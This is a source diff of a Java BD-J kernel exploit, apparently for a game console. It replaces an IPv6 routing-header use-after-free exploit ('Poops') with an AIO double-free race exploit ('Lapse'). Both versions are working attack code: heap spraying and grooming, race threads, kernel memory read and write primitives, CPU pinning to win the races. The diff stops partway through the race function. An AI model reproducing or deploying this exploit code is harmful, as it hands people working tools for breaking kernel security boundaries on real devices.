@@ -1,1077 +1,1294 @@
 package org.bdj.external;
+
 import java.util.*;
 import java.io.*;
 
 import org.bdj.api.*;
 
-public class Poops {
-    // constants
-    private static final int AF_UNIX = 1;
-    private static final int AF_INET6 = 28;
-    private static final int SOCK_STREAM = 1;
-    private static final int IPPROTO_IPV6 = 41;
+public class Lapse {
 
-    private static final int IPV6_RTHDR = 51;
-    private static final int IPV6_RTHDR_TYPE_0 = 0;
-    private static final int UCRED_SIZE = 0x168;
-    private static final int MSG_HDR_SIZE = 0x30;
-    private static final int UIO_IOV_NUM = 0x14;
-    private static final int MSG_IOV_NUM = 0x17;
-    private static final int IOV_SIZE = 0x10;
+    public static final int MAIN_CORE = 4;
+    public static final int MAIN_RTPRIO = 0x100;
+    public static final int NUM_WORKERS = 2;
+    public static final int NUM_GROOMS = 0x200;
+    public static final int NUM_SDS = 64;
+    public static final int NUM_SDS_ALT = 48;
+    public static final int NUM_RACES = 100;
+    public static final int NUM_ALIAS = 100;
+    public static final int NUM_HANDLES = 0x100;
+    public static final int LEAK_LEN = 16;
+    public static final int NUM_LEAKS = 16;
+    public static final int NUM_CLOBBERS = 8;
 
-    private static final int IPV6_SOCK_NUM = 128;
-    private static final int TWIN_TRIES = 15000;
-    private static final int UAF_TRIES = 50000;
-    private static final int KQUEUE_TRIES = 300000;
-    private static final int IOV_THREAD_NUM = 4;
-    private static final int UIO_THREAD_NUM = 4;
-    private static final int PIPEBUF_SIZE = 0x18;
-
-    private static final int COMMAND_UIO_READ = 0;
-    private static final int COMMAND_UIO_WRITE = 1;
-    private static final int PAGE_SIZE = 0x4000;
-    private static final int FILEDESCENT_SIZE = 0x8;
-
-    private static final int UIO_READ = 0;
-    private static final int UIO_WRITE = 1;
-    private static final int UIO_SYSSPACE = 1;
-
-    private static final int NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
-    private static final int NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;
-    private static final int RTHDR_TAG = 0x13370000;
-
-    private static final int SOL_SOCKET = 0xffff;
-    private static final int SO_SNDBUF = 0x1001;
-
-    private static final int F_SETFL = 4;
-    private static final int O_NONBLOCK = 4;
-
-    // system methods
-    private static long dup;
-    private static long close;
-    private static long read;
-    private static long readv;
-    private static long write;
-    private static long writev;
-    private static long ioctl;
-    private static long fcntl;
-    private static long pipe;
-    private static long kqueue;
-    private static long socket;
-    private static long socketpair;
-    private static long recvmsg;
-    private static long getsockopt;
-    private static long setsockopt;
-    private static long setuid;
-    private static long getpid;
-    private static long sched_yield;
-    private static long cpuset_setaffinity;
-    private static long __sys_netcontrol;
-
-    // ploit data
-    private static Buffer leakRthdr = new Buffer(UCRED_SIZE);
-    private static Int32 leakRthdrLen = new Int32();
-    private static Buffer sprayRthdr = new Buffer(UCRED_SIZE);
-    private static Buffer msg = new Buffer(MSG_HDR_SIZE);
-    private static int sprayRthdrLen;
-    private static Buffer msgIov = new Buffer(MSG_IOV_NUM * IOV_SIZE);
-    private static Buffer dummyBuffer = new Buffer(0x1000);
-    private static Buffer tmp = new Buffer(PAGE_SIZE);
-    private static Buffer victimPipebuf = new Buffer(PIPEBUF_SIZE);
-    private static Buffer uioIovRead = new Buffer(UIO_IOV_NUM * IOV_SIZE);
-    private static Buffer uioIovWrite = new Buffer(UIO_IOV_NUM * IOV_SIZE);
-
-    private static Int32Array uioSs = new Int32Array(2);
-    private static Int32Array iovSs = new Int32Array(2);
-
-    private static IovThread[] iovThreads = new IovThread[IOV_THREAD_NUM];
-    private static UioThread[] uioThreads = new UioThread[UIO_THREAD_NUM];
-
-    private static WorkerState iovState = new WorkerState(IOV_THREAD_NUM);
-    private static WorkerState uioState = new WorkerState(UIO_THREAD_NUM);
-
-    private static int uafSock;
-
-    private static int uioSs0;
-    private static int uioSs1;
-
-    private static int iovSs0;
-    private static int iovSs1;
-
-    private static long kl_lock;
-    private static long kq_fdp;
-    private static long fdt_ofiles;
-    private static long allproc;
-
-    private static int[] twins = new int[2];
-    private static int[] triplets = new int[3];
-    private static int[] ipv6Socks = new int[IPV6_SOCK_NUM];
-
-    private static Int32Array masterPipeFd = new Int32Array(2);
-    private static Int32Array victimPipeFd = new Int32Array(2);
-
-    private static int masterRpipeFd;
-    private static int masterWpipeFd;
-    private static int victimRpipeFd;
-    private static int victimWpipeFd;
-
-    // misc data
+    private static int blockFd = -1;
+    private static int unblockFd = -1;
+    private static int blockId = -1;
+    private static int[] groomIds;
+    private static int[] sockets;
+    private static int[] socketsAlt;
     private static int previousCore = -1;
-
     private static Kernel.KernelRW kernelRW;
 
+    // Kernel leak results from Stage 2
+    private static long reqs1Addr;
+    private static long kbufAddr;
+    private static long kernelAddr;
+    private static int targetId;
+    private static int evf;
+    private static long fakeReqs3Addr;
+    private static int fakeReqs3Sd;
+    private static long aioInfoAddr;
+    
     private static PrintStream console;
-
-    private static long kBase;
-
     private static API api;
 
-    // sys methods
-    private static int dup(int fd) {
-        return (int) Helper.api.call(dup, fd);
-    }
-
-    private static int close(int fd) {
-        return (int) Helper.api.call(close, fd);
-    }
-
-    private static long read(int fd, Buffer buf, long nbytes) {
-        return Helper.api.call(read, fd, buf != null ? buf.address() : 0, nbytes);
-    }
-
-    private static long readv(int fd, Buffer iov, int iovcnt) {
-        return Helper.api.call(readv, fd, iov != null ? iov.address() : 0, iovcnt);
-    }
-
-    private static long write(int fd, Buffer buf, long nbytes) {
-        return Helper.api.call(write, fd, buf != null ? buf.address() : 0, nbytes);
-    }
-
-    private static long writev(int fd, Buffer iov, int iovcnt) {
-        return Helper.api.call(writev, fd, iov != null ? iov.address() : 0, iovcnt);
-    }
-
-    private static int ioctl(int fd, long request, long arg0) {
-        return (int) Helper.api.call(ioctl, fd, request, arg0);
-    }
-
-    private static int fcntl(int fd, int cmd, long arg0) {
-        return (int) Helper.api.call(fcntl, fd, cmd, arg0);
-    }
-
-    private static int pipe(Int32Array fildes) {
-        return (int) Helper.api.call(pipe, fildes != null ? fildes.address() : 0);
-    }
-
-    private static int kqueue() {
-        return (int) Helper.api.call(kqueue);
-    }
-
-    private static int socket(int domain, int type, int protocol) {
-        return (int) Helper.api.call(socket, domain, type, protocol);
-    }
-
-    private static int socketpair(int domain, int type, int protocol, Int32Array sv) {
-        return (int) Helper.api.call(socketpair, domain, type, protocol, sv != null ? sv.address() : 0);
-    }
-
-    private static int recvmsg(int s, Buffer msg, int flags) {
-        return (int) Helper.api.call(recvmsg, s, msg != null ? msg.address() : 0, flags);
-    }
-
-    private static int getsockopt(int s, int level, int optname, Buffer optval, Int32 optlen) {
-        return (int) Helper.api.call(getsockopt, s, level, optname, optval != null ? optval.address() : 0, optlen != null ? optlen.address() : 0);
-    }
-
-    private static int setsockopt(int s, int level, int optname, Buffer optval, int optlen) {
-        return (int) Helper.api.call(setsockopt, s, level, optname, optval != null ? optval.address() : 0, optlen);
-    }
-
-    private static int setuid(int uid) {
-        return (int) Helper.api.call(setuid, uid);
-    }
-
-    private static int getpid() {
-        return (int) Helper.api.call(getpid);
-    }
-
-    private static int sched_yield() {
-        return (int) Helper.api.call(sched_yield);
-    }
-
-    private static int __sys_netcontrol(int ifindex, int cmd, Buffer buf, int size) {
-        return (int) Helper.api.call(__sys_netcontrol, ifindex, cmd, buf != null ? buf.address() : 0, size);
-    }
-
-    private static int cpusetSetAffinity(int core) {
-        Buffer mask = new Buffer(0x10);
-        mask.putShort(0x00, (short) (1 << core));
-        return cpuset_setaffinity(3, 1, 0xFFFFFFFFFFFFFFFFL, 0x10, mask);
-    }
-
-    private static int cpuset_setaffinity(int level, int which, long id, long setsize, Buffer mask) {
-        return (int)api.call(cpuset_setaffinity, level, which, id, setsize, mask != null ? mask.address() : 0);
-    }
-
-    public static void cleanup() {
-        for (int i = 0; i < ipv6Socks.length; i++) {
-            close(ipv6Socks[i]);
+    static {
+        try {
+            api = API.getInstance();
+        } catch (Exception e) {
+            throw new ExceptionInInitializerError(e);
         }
-        close(uioSs1);
-        close(uioSs0);
-        close(iovSs1);
-        close(iovSs0);
-        for (int i = 0; i < IOV_THREAD_NUM; i++) {
-            if (iovThreads[i] != null) {
-                iovThreads[i].interrupt();
-                try {
-                    iovThreads[i].join();
-                } catch (Exception e) {}
+    }
+
+    // Worker thread for AIO deletion race
+    public static class DeleteWorkerThread extends Thread {
+        private long requestAddr;
+        private Buffer errors;
+        private int pipeFd;
+        private volatile boolean ready = false;
+        private volatile boolean completed = false;
+        private volatile int workerError = -1;
+
+        public DeleteWorkerThread(long requestAddr, Buffer errors, int pipeFd) {
+            this.requestAddr = requestAddr;
+            this.errors = errors;
+            this.pipeFd = pipeFd;
+        }
+
+        public void run() {
+            try {
+                ready = true;
+
+                // Block on pipe read
+                Buffer pipeBuf = new Buffer(8);
+                Helper.syscall(Helper.SYS_READ, (long)pipeFd, pipeBuf.address(), 1L);
+
+                // Execute AIO deletion
+                Helper.aioMultiDelete(requestAddr, 1, errors.address() + 4);
+
+                workerError = errors.getInt(4);
+                completed = true;
+
+            } catch (Exception e) {
+                workerError = -1;
+                completed = true;
             }
         }
-        for (int i = 0; i < UIO_THREAD_NUM; i++) {
-            if (iovThreads[i] != null) {
-                uioThreads[i].interrupt();
-                try {
-                    uioThreads[i].join();
-                } catch (Exception e) {}
-            }
-        }
-        if (previousCore >= 0 && previousCore != 4) {
-            //console.println("back to core " + previousCore);
-            Helper.pinToCore(previousCore);
-            previousCore = -1;
-        }
+
+        public boolean isReady() { return ready; }
+        public boolean isCompleted() { return completed; }
+        public int getWorkerError() { return workerError; }
     }
 
-    private static int buildRthdr(Buffer buf, int size) {
-        int len = ((size >> 3) - 1) & ~1;
-        buf.putByte(0x00, (byte) 0); // ip6r_nxt
-        buf.putByte(0x01, (byte) len); // ip6r_len
-        buf.putByte(0x02, (byte) IPV6_RTHDR_TYPE_0); // ip6r_type
-        buf.putByte(0x03, (byte) (len >> 1)); // ip6r_segleft
-        return (len + 1) << 3;
-    }
-
-    private static int getRthdr(int s, Buffer buf, Int32 len) {
-        return getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
-    }
-
-    private static int setRthdr(int s, Buffer buf, int len) {
-        return setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
-    }
-
-    private static int freeRthdr(int s) {
-        return setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, null, 0);
-    }
-
-    private static void buildUio(Buffer uio, long uio_iov, long uio_td, boolean read, long addr, long size) {
-        uio.putLong(0x00, uio_iov); // uio_iov
-        uio.putLong(0x08, UIO_IOV_NUM); // uio_iovcnt
-        uio.putLong(0x10, 0xFFFFFFFFFFFFFFFFL); // uio_offset
-        uio.putLong(0x18, size); // uio_resid
-        uio.putInt(0x20, UIO_SYSSPACE); // uio_segflg
-        uio.putInt(0x24, read ? UIO_WRITE : UIO_READ); // uio_segflg
-        uio.putLong(0x28, uio_td); // uio_td
-        uio.putLong(0x30, addr); // iov_base
-        uio.putLong(0x38, size); // iov_len
-    }
-
-    private static Buffer kreadSlow(long addr, int size) {
-        Buffer[] leakBuffers = new Buffer[UIO_THREAD_NUM];
-        for (int i = 0; i < UIO_THREAD_NUM; i++) {
-            leakBuffers[i] = new Buffer(size);
+    // Initialize all classes in proper order
+    private static void initializeExploit() {
+        try {
+            Kernel.initializeKernelOffsets();            
+        } catch (Exception e) {
+            throw new RuntimeException("Initialization failed", e);
         }
-        Int32 bufSize = new Int32(size);
-        setsockopt(uioSs1, SOL_SOCKET, SO_SNDBUF, bufSize, bufSize.size());
-        write(uioSs1, tmp, size);
-        uioIovRead.putLong(0x08, size);
-        freeRthdr(ipv6Socks[triplets[1]]);
-        while (true) {
-            uioState.signalWork(COMMAND_UIO_READ);
-            sched_yield();
-            leakRthdrLen.set(0x10);
-            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
-            if (leakRthdr.getInt(0x08) == UIO_IOV_NUM) {
-                break;
-            }
-            read(uioSs0, tmp, size);
-            for (int i = 0; i < UIO_THREAD_NUM; i++) {
-                read(uioSs0, leakBuffers[i], leakBuffers[i].size());
-            }
-            uioState.waitForFinished();
-            write(uioSs1, tmp, size);
-        }
-        long uio_iov = leakRthdr.getLong(0x00);
-        buildUio(msgIov, uio_iov, 0, true, addr, size);
-        freeRthdr(ipv6Socks[triplets[2]]);
-        while (true) {
-            iovState.signalWork(0);
-            sched_yield();
-            leakRthdrLen.set(0x40);
-            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
-            if (leakRthdr.getInt(0x20) == UIO_SYSSPACE) {
-                break;
-            }
-            write(iovSs1, tmp, Int8.SIZE);
-            iovState.waitForFinished();
-            read(iovSs0, tmp, Int8.SIZE);
-        }
-        read(uioSs0, tmp, size);
-        Buffer leakBuffer = null;
-        for (int i = 0; i < UIO_THREAD_NUM; i++) {
-            read(uioSs0, leakBuffers[i], leakBuffers[i].size());
-            if (leakBuffers[i].getLong(0x00) != 0x4141414141414141L) {
-                triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
-                if (triplets[1] == -1)
-                {
-                    console.println("kreadSlow triplet failure 1");
-                    return null;
-                }
-                leakBuffer = leakBuffers[i];
-            }
-        }
-        uioState.waitForFinished();
-        write(iovSs1, tmp, Int8.SIZE);
-        triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
-        if (triplets[2] == -1)
-        {
-            console.println("kreadSlow triplet failure 2");
-            return null;
-        }
-        iovState.waitForFinished();
-        read(iovSs0, tmp, Int8.SIZE);
-        return leakBuffer;
-    }
-
-    private static boolean kwriteSlow(long addr, Buffer buffer) {
-        Int32 bufSize = new Int32(buffer.size());
-        setsockopt(uioSs1, SOL_SOCKET, SO_SNDBUF, bufSize, bufSize.size());
-        uioIovWrite.putLong(0x08, buffer.size());
-        freeRthdr(ipv6Socks[triplets[1]]);
-        while (true) {
-            uioState.signalWork(COMMAND_UIO_WRITE);
-            sched_yield();
-            leakRthdrLen.set(0x10);
-            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
-            if (leakRthdr.getInt(0x08) == UIO_IOV_NUM) {
-                break;
-            }
-            for (int i = 0; i < UIO_THREAD_NUM; i++) {
-                write(uioSs1, buffer, buffer.size());
-            }
-            uioState.waitForFinished();
-        }
-        long uio_iov = leakRthdr.getLong(0x00);
-        buildUio(msgIov, uio_iov, 0, false, addr, buffer.size());
-        freeRthdr(ipv6Socks[triplets[2]]);
-        while (true) {
-            iovState.signalWork(0);
-            sched_yield();
-            leakRthdrLen.set(0x40);
-            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
-            if (leakRthdr.getInt(0x20) == UIO_SYSSPACE) {
-                break;
-            }
-            write(iovSs1, tmp, Int8.SIZE);
-            iovState.waitForFinished();
-            read(iovSs0, tmp, Int8.SIZE);
-        }
-        for (int i = 0; i < UIO_THREAD_NUM; i++) {
-            write(uioSs1, buffer, buffer.size());
-        }
-        triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
-        if (triplets[1] == -1)
-        {
-            console.println("kwriteSlow triplet failure 1");
-            return false;
-        }
-        uioState.waitForFinished();
-        write(iovSs1, tmp, Int8.SIZE);
-        triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
-        if (triplets[2] == -1)
-        {
-            console.println("kwriteSlow triplet failure 2");
-            return false;
-        }
-        iovState.waitForFinished();
-        read(iovSs0, tmp, Int8.SIZE);
-        return true;
     }
 
     public static boolean performSetup() {
+
         try {
-            api = API.getInstance();
-
-            dup = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "dup");
-            close = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "close");
-            read = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "read");
-            readv = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "readv");
-            write = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "write");
-            writev = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "writev");
-            ioctl = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "ioctl");
-            fcntl = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "fcntl");
-            pipe = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "pipe");
-            kqueue = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "kqueue");
-            socket = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "socket");
-            socketpair = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "socketpair");
-            recvmsg = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "recvmsg");
-            getsockopt = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "getsockopt");
-            setsockopt = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "setsockopt");
-            setuid = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "setuid");
-            getpid = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "getpid");
-            sched_yield = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "sched_yield");
-            cpuset_setaffinity = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "cpuset_setaffinity");
-            __sys_netcontrol = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "__sys_netcontrol");
-            if (dup == 0 || close == 0 || read == 0 || readv == 0 || write == 0 || writev == 0  || ioctl == 0 || fcntl == 0 || pipe == 0 || kqueue == 0 || socket == 0 || socketpair == 0 ||
-            recvmsg == 0 || getsockopt == 0 || setsockopt == 0 || setuid == 0 || getpid == 0 || sched_yield == 0 || __sys_netcontrol == 0 || cpuset_setaffinity == 0) {
-                console.println("failed to resolve symbols");
-                return false;
-            }
-
-            // Prepare spray buffer.
-            sprayRthdrLen = buildRthdr(sprayRthdr, UCRED_SIZE);
-
-            // Prepare msg iov buffer.
-            msg.putLong(0x10, msgIov.address()); // msg_iov
-            msg.putLong(0x18, MSG_IOV_NUM); // msg_iovlen
-
-            dummyBuffer.fill((byte) 0x41);
-            uioIovRead.putLong(0x00, dummyBuffer.address());
-            uioIovWrite.putLong(0x00, dummyBuffer.address());
-
-            // affinity
+            // CPU pinning and priority
             previousCore = Helper.getCurrentCore();
 
-            if (cpusetSetAffinity(4) != 0) {
-                console.println("failed to pin to core");
+            if (!Helper.pinToCore(MAIN_CORE)) {
                 return false;
             }
 
-            if (!Helper.setRealtimePriority(256)) {
-                console.println("failed realtime priority");
+            if (!Helper.setRealtimePriority(MAIN_RTPRIO)) {
                 return false;
             }
 
-            // Create socket pair for uio spraying.
-            socketpair(AF_UNIX, SOCK_STREAM, 0, uioSs);
-            uioSs0 = uioSs.get(0);
-            uioSs1 = uioSs.get(1);
 
-            // Create socket pair for iov spraying.
-            socketpair(AF_UNIX, SOCK_STREAM, 0, iovSs);
-            iovSs0 = iovSs.get(0);
-            iovSs1 = iovSs.get(1);
-
-            // Create iov threads.
-            for (int i = 0; i < IOV_THREAD_NUM; i++) {
-                iovThreads[i] = new IovThread(iovState);
-                iovThreads[i].start();
+            // Create socketpair for blocking
+            if (!createSocketPair()) {
+                return false;
             }
 
-            // Create uio threads.
-            for (int i = 0; i < UIO_THREAD_NUM; i++) {
-                uioThreads[i] = new UioThread(uioState);
-                uioThreads[i].start();
+            // Block AIO workers
+            Buffer blockReqs = new Buffer(0x28 * NUM_WORKERS);
+            blockReqs.fill((byte)0);
+
+            for (int i = 0; i < NUM_WORKERS; i++) {
+                int offset = i * 0x28;
+                blockReqs.putInt(offset + 0x08, 1);         // nbyte
+                blockReqs.putInt(offset + 0x20, blockFd);   // fd = blockFd
             }
 
-            // Set up sockets for spraying.
-            for (int i = 0; i < ipv6Socks.length; i++) {
-                ipv6Socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
+            Buffer blockIdBuf = new Buffer(4);
+            long result = Helper.aioSubmitCmd(Helper.AIO_CMD_READ, blockReqs.address(), NUM_WORKERS, 
+                                             Helper.AIO_PRIORITY_HIGH, blockIdBuf.address());
+            if (result != 0) {
+                return false;
             }
 
-            // Initialize pktopts.
-            for (int i = 0; i < ipv6Socks.length; i++) {
-                freeRthdr(ipv6Socks[i]);
+            blockId = blockIdBuf.getInt(0);
+
+            // Heap grooming
+            int numReqs = 3;
+            Buffer groomReqs = Helper.createAioRequests(numReqs);
+
+            groomIds = new int[NUM_GROOMS];
+            int validCount = 0;
+
+            for (int i = 0; i < NUM_GROOMS; i++) {
+                Buffer singleId = new Buffer(4);
+                result = Helper.aioSubmitCmd(Helper.AIO_CMD_READ, groomReqs.address(), numReqs, 
+                                           Helper.AIO_PRIORITY_HIGH, singleId.address());
+                if (result == 0) {
+                    groomIds[i] = singleId.getInt(0);
+                    validCount++;
+                } else {
+                    groomIds[i] = 0;
+                }
             }
 
-            // init pipes
-            pipe(masterPipeFd);
-            pipe(victimPipeFd);
 
-            masterRpipeFd = masterPipeFd.get(0);
-            masterWpipeFd = masterPipeFd.get(1);
-            victimRpipeFd = victimPipeFd.get(0);
-            victimWpipeFd = victimPipeFd.get(1);
+            // Cancel grooming AIOs
+            cancelGroomAios();
 
-            fcntl(masterRpipeFd, F_SETFL, O_NONBLOCK);
-            fcntl(masterWpipeFd, F_SETFL, O_NONBLOCK);
-            fcntl(victimRpipeFd, F_SETFL, O_NONBLOCK);
-            fcntl(victimWpipeFd, F_SETFL, O_NONBLOCK);
+            return true;
+            
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private static boolean createSocketPair() {
+        try {
+            Buffer sockpair = new Buffer(8);
+            long result = Helper.syscall(Helper.SYS_SOCKETPAIR, (long)Helper.AF_UNIX, 
+                                       (long)Helper.SOCK_STREAM, 0L, sockpair.address());
+            if (result != 0) {
+                return false;
+            }
+
+            blockFd = sockpair.getInt(0);
+            unblockFd = sockpair.getInt(4);
 
             return true;
         } catch (Exception e) {
-            console.println("exception during performSetup");
             return false;
         }
     }
 
-    private static boolean findTwins(int timeout) {
-        while (timeout-- != 0) {
-            for (int i = 0; i < ipv6Socks.length; i++) {
-                sprayRthdr.putInt(0x04, RTHDR_TAG | i);
-                setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
-            }
+    private static void cancelGroomAios() {
+        try {
+            Buffer errors = new Buffer(4 * Helper.MAX_AIO_IDS);
 
-            for (int i = 0; i < ipv6Socks.length; i++) {
-                leakRthdrLen.set(Int64.SIZE);
-                getRthdr(ipv6Socks[i], leakRthdr, leakRthdrLen);
-                int val = leakRthdr.getInt(0x04);
-                int j = val & 0xFFFF;
-                if ((val & 0xFFFF0000) == RTHDR_TAG && i != j) {
-                    twins[0] = i;
-                    twins[1] = j;
-                    return true;
+            for (int i = 0; i < NUM_GROOMS; i += Helper.MAX_AIO_IDS) {
+                int batchSize = Math.min(Helper.MAX_AIO_IDS, NUM_GROOMS - i);
+                Buffer batchIds = new Buffer(4 * batchSize);
+
+                for (int j = 0; j < batchSize; j++) {
+                    batchIds.putInt(j * 4, groomIds[i + j]);
                 }
+
+                Helper.aioMultiCancel(batchIds.address(), batchSize, errors.address());
             }
+        } catch (Exception e) {
         }
-        return false;
     }
 
-    private static int findTriplet(int master, int other, int timeout) {
-        while (timeout-- != 0) {
-            for (int i = 0; i < ipv6Socks.length; i++) {
-                if (i == master || i == other) {
-                    continue;
-                }
-                sprayRthdr.putInt(0x04, RTHDR_TAG | i);
-                setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
+    // STAGE 1: Double-free reqs2
+    public static int[] executeStage1() {
+
+        try {
+            sockets = new int[NUM_SDS];
+            for (int i = 0; i < NUM_SDS; i++) {
+                sockets[i] = Helper.createUdpSocket();
             }
 
-            for (int i = 0; i < ipv6Socks.length; i++) {
-                if (i == master || i == other) {
+            Buffer serverAddr = new Buffer(16);
+            serverAddr.fill((byte)0);
+            serverAddr.putByte(1, (byte)Helper.AF_INET);
+            serverAddr.putShort(2, Helper.htons(5050));
+            serverAddr.putInt(4, Helper.aton("127.0.0.1"));
+
+            int listenSd = Helper.createTcpSocket();
+            if (listenSd < 0) {
+                return null;
+            }
+
+            // Set SO_REUSEADDR
+            Buffer enable = new Buffer(4);
+            enable.putInt(0, 1);
+            Helper.setSockOpt(listenSd, Helper.SOL_SOCKET, Helper.SO_REUSEADDR, enable, 4);
+
+            // Bind and listen
+            long bindResult = Helper.syscall(Helper.SYS_BIND, (long)listenSd, serverAddr.address(), 16L);
+            if (bindResult != 0) {
+                Helper.syscall(Helper.SYS_CLOSE, (long)listenSd);
+                return null;
+            }
+
+            long listenResult = Helper.syscall(Helper.SYS_LISTEN, (long)listenSd, 1L);
+            if (listenResult != 0) {
+                Helper.syscall(Helper.SYS_CLOSE, (long)listenSd);
+                return null;
+            }
+
+            // Main race loop
+            int numReqs = 3;
+            int whichReq = numReqs - 1;
+
+            for (int attempt = 1; attempt <= NUM_RACES; attempt++) {
+
+                int clientSd = Helper.createTcpSocket();
+                if (clientSd < 0) {
                     continue;
                 }
-                leakRthdrLen.set(Int64.SIZE);
-                getRthdr(ipv6Socks[master], leakRthdr, leakRthdrLen);
-                int val = leakRthdr.getInt(0x04);
-                int j = val & 0xFFFF;
-                if ((val & 0xFFFF0000) == RTHDR_TAG && j != master && j != other) {
-                    return j;
+
+                long connectResult = Helper.syscall(Helper.SYS_CONNECT, (long)clientSd, 
+                                                   serverAddr.address(), 16L);
+                if (connectResult != 0) {
+                    Helper.syscall(Helper.SYS_CLOSE, (long)clientSd);
+                    continue;
+                }
+
+                long connSd = Helper.syscall(Helper.SYS_ACCEPT, (long)listenSd, 0L, 0L);
+                if (connSd < 0) {
+                    Helper.syscall(Helper.SYS_CLOSE, (long)clientSd);
+                    continue;
+                }
+
+                // Set SO_LINGER to force soclose() delay
+                Buffer lingerBuf = new Buffer(8);
+                lingerBuf.fill((byte)0);
+                lingerBuf.putInt(0, 1);  // l_onoff - linger active
+                lingerBuf.putInt(4, 1);  // l_linger - 1 second
+
+                Helper.setSockOpt(clientSd, Helper.SOL_SOCKET, Helper.SO_LINGER, lingerBuf, 8);
+
+                // Create AIO requests
+                Buffer reqs = Helper.createAioRequests(numReqs);
+                Buffer aioIds = new Buffer(4 * numReqs);
+
+                // Set client socket fd in the target request
+                reqs.putInt(whichReq * 0x28 + 0x20, clientSd);
+
+                // Submit AIO requests
+                long submitResult = Helper.aioSubmitCmd(Helper.AIO_CMD_MULTI_READ, reqs.address(), 
+                                                      numReqs, Helper.AIO_PRIORITY_HIGH, aioIds.address());
+                if (submitResult != 0) {
+                    Helper.syscall(Helper.SYS_CLOSE, (long)clientSd);
+                    Helper.syscall(Helper.SYS_CLOSE, connSd);
+                    continue;
+                }
+
+                Buffer errors = new Buffer(4 * numReqs);
+                Helper.aioMultiCancel(aioIds.address(), numReqs, errors.address());
+                Helper.aioMultiPoll(aioIds.address(), numReqs, errors.address());
+
+                // Close client socket to trigger fdrop() reference counting
+                Helper.syscall(Helper.SYS_CLOSE, (long)clientSd);
+
+                // Execute the race
+                long requestAddr = aioIds.address() + (whichReq * 4);
+                int[] aliasedPair = raceOne(requestAddr, (int)connSd, sockets);
+
+                // Cleanup remaining AIOs
+                Helper.aioMultiDelete(aioIds.address(), numReqs, errors.address());
+                Helper.syscall(Helper.SYS_CLOSE, connSd);
+
+                if (aliasedPair != null) {
+                    Helper.syscall(Helper.SYS_CLOSE, (long)listenSd);
+                    return aliasedPair;
+                }
+
+                if (attempt % 10 == 0) {
+                    try {
+                        Thread.sleep(10);
+                    } catch (InterruptedException e) {
+                        break;
+                    }
+                }
+            }
+
+            Helper.syscall(Helper.SYS_CLOSE, (long)listenSd);
+            return null;
+
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
+    private static int[] raceOne(long requestAddr, int tcpSd, int[] testSockets) {
+        try {
+            Buffer sceErrs = new Buffer(8);
+            sceErrs.putInt(0, -1);
+            sceErrs.putInt(4, -1);
+
+            // Create pipe for synchronization
+            Buffer pipe = new Buffer(8);
+            long pipeResult = Helper.syscall(Helper.SYS_SOCKETPAIR, (long)Helper.AF_UNIX, 
+                                           (long)Helper.SOCK_STREAM, 0L, pipe.address());
+            if (pipeResult != 0) {
+                return null;
+            }
+
+            int pipeReadFd = pipe.getInt(0);
+            int pipeWriteFd = pipe.getInt(4);
+
+            // Start worker thread
+            DeleteWorkerThread worker = new DeleteWorkerThread(requestAddr, sceErrs, pipeReadFd);
+            worker.start();
+
+            // Wait for worker to be ready
+            int waitCount = 0;
+            while (!worker.isReady() && waitCount < 1000) {
+                Thread.yield();
+                waitCount++;
+            }
+            
+            if (!worker.isReady()) {
+                Helper.syscall(Helper.SYS_CLOSE, (long)pipeReadFd);
+                Helper.syscall(Helper.SYS_CLOSE, (long)pipeWriteFd);
+                return null;
+            }
+
+            // Signal worker to proceed
+            Buffer pipeBuf = new Buffer(8);
+            Helper.syscall(Helper.SYS_WRITE, (long)pipeWriteFd, pipeBuf.address(), 1L);
+
+            // Yield once to let worker start, then poll immediately
+            Thread.yield();
+
+            // Poll AIO state while worker should be blocked in soclose()
+            Buffer pollErr = new Buffer(4);
+            Helper.aioMultiPoll(requestAddr, 1, pollErr.address());
+            int pollRes = pollErr.getInt(0);
+
+            // Check TCP state
+            Buffer infoBuffer = new Buffer(0x100);
+            int infoSize = Helper.getSockOpt(tcpSd, Helper.IPPROTO_TCP, Helper.TCP_INFO, infoBuffer, 0x100);
+            int tcpState = (infoSize > 0) ? (infoBuffer.getByte(0) & 0xFF) : -1;
+
+            boolean wonRace = false;
+
